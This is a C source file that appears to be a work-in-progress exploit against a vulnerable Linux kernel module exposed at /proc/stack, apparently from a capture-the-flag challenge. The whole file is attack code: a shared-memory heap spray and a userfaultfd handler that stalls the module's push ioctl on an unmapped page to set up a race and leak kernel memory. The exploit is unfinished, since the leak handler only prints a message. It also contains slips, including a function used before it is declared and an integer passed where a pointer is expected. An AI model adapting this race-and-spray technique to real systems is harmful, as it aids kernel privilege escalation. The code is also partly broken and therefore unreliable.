#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <poll.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/un.h>
#include <sys/xattr.h>
#include <linux/userfaultfd.h>

// Defines
#define CMD_PUSH 0x57ac0001
#define CMD_POP  0x57ac0002

// Global Variables
int kstack_fd;
pthread_t uffd_thread;
unsigned long long kernel_leak;

// Structs
typedef struct 
{
    long uffd;
    unsigned long long page_start;
    void *(*wp_fault_func)(void *);
    void *(*read_fault_func)(void *,struct uffdio_copy*);
} userfd_callback_args;

//Functions
void push(unsigned long long *val){
    if(ioctl(kstack_fd,CMD_PUSH,val) < 0) err("[!] Push ioctl err");
}
void pop(unsigned long long *val){
    if(ioctl(kstack_fd,CMD_POP,val) < 0) err("[!] Pop ioctl err");
}
void err(const char *msg)
{
    perror(msg);
    exit(-1);
}
void shm_spray()
{
    printf("[*] Spraying shmem struct\n");
    int shmid = shmget(IPC_PRIVATE,0x1000,0600);
    if (shmid < 0) err("[!] Shmget Error");
    char *shm_addr= shmat(shmid,0,0);
    if(shm_addr == -1) err("[!] Shmat Error\n");
    printf("[*] Destroying shmem struct\n");
    shmdt(shm_addr);
}
void *userfd_thread_func(void *args)
{
    struct uffd_msg msg;

    userfd_callback_args *cb_args = (userfd_callback_args *)args;

    struct pollfd pollfd = {
        .fd = cb_args->uffd,
        .events = POLLIN};

    while (poll(&pollfd, 1, -1) > 0)
    {
        if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
            err("polling error");

        if (!(pollfd.revents & POLLIN))
            continue;

        if (read(cb_args->uffd, &msg, sizeof(msg)) == 0)
            err("read uffd event");

        printf("Userfault event\n");
        printf("======================================================================\n");

        if (msg.event & UFFD_EVENT_PAGEFAULT)
            printf("PAGEFAULT : %p / Flags %p\n", (void *)msg.arg.pagefault.address, msg.arg.pagefault.flags);

        long long addr = msg.arg.pagefault.address;
        long long page_begin = addr - (addr % 0x1000);

        // Check for write fault
        if (msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WRITE)
        {
            continue;
        }else{
            puts("[*] Read Fault");
        }

        // Page wasn't touched by now, so fill it
        printf("UFFDIO_COPY\n");
        char buf[0x1000];

        struct uffdio_copy cp = {
            .src = (long long)buf,
            .dst = (long long)addr,
            .len = (long long)0x1000,
            .mode = 0
        };
                
        // If defined, call read protect fault handler
        if(cb_args->read_fault_func)
            cb_args->read_fault_func(cb_args, &cp);

        if (ioctl(cb_args->uffd, UFFDIO_COPY, &cp) == -1)
        {
            perror("ioctl(UFFDIO_COPY)");
        }

        printf("[+] Sent UFFDIO_COPY event to userfaultfd\n");
        printf("======================================================================\n\n");
        fflush(stdout);
    }
    return NULL;
}
void break_on_read_leak(void *args,struct uffdio_copy* uffd_buf)
{
    puts("[*] Function Break on leak");
}
userfd_callback_args *register_userfaultfd(unsigned long long mode,void *(write_fault_func)(void *),void *(*read_fault_func)(void *,struct uffdio_copy*))
{
    printf("\n");
    printf("Register userfaultdfd\n");
    printf("======================================================================\n");

    // setup userfault fd
    int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);

    if (uffd == -1)
    {
        perror("syscall");
        exit(-1);
    }

    int uffd_flags = fcntl(uffd, F_GETFD, NULL);

    printf("[+] Userfaultfd registered : FD %d / Flags: %p\n", uffd, uffd_flags);

    struct uffdio_api uffdio_api = {
        .api = UFFD_API,
        .features = 0};

    if (ioctl(uffd, UFFDIO_API, &uffdio_api))
    {
        perror("UFFDIO_API");
        exit(-1);
    }

    printf("[+] Userfaultfd api : Features %p\n", uffdio_api.features);
    long long len = sysconf(_SC_PAGE_SIZE) * 4;
    char* userfault_region = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    printf("[+] Default Userfault_region: %p\n",userfault_region);
    if (!userfault_region)
    {
        perror("mmap");
        exit(-1);
    }
    printf("[+] Userfaultfd region : %p - %p\n", userfault_region, userfault_region + len);

    struct uffdio_register uffdio_register;

    uffdio_register.range.start = (unsigned long long)userfault_region;
    uffdio_register.range.len = len;
    uffdio_register.mode = mode;

    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    {
        perror("ioctl(UFFDIO_REGISTER)");
        exit(1);
    }

    printf("[+] Userfaultfd region registered: ioctls %p\n", uffdio_register.ioctls);
    userfd_callback_args *cb_args = malloc(sizeof(userfd_callback_args));

    cb_args->uffd = uffd;
    cb_args->wp_fault_func = write_fault_func;
    cb_args->read_fault_func = read_fault_func;
    cb_args->page_start = (unsigned long long)userfault_region;

    pthread_create(&uffd_thread, NULL, userfd_thread_func, cb_args);

    printf("[+] Userfaultfd process thread started: %p\n", uffd_thread);

    printf("======================================================================\n\n");    

    return cb_args;
}

int main()
{
    kstack_fd = open("/proc/stack",O_RDWR);
    if (kstack_fd < 0) err("[!] Could'nt Open /proc/kstack");
    printf("[*] Opened /proc/stack with fd: %d\n",kstack_fd);
    shm_spray();
    userfd_callback_args *uffd_args = register_userfaultfd(UFFDIO_REGISTER_MODE_MISSING,NULL,break_on_read_leak);
    puts("[*] Calling push on uffd region");
    push(uffd_args->page_start);
    unsigned long long val = 0xdeadbeef;
    push(&val);
    return 0;
}



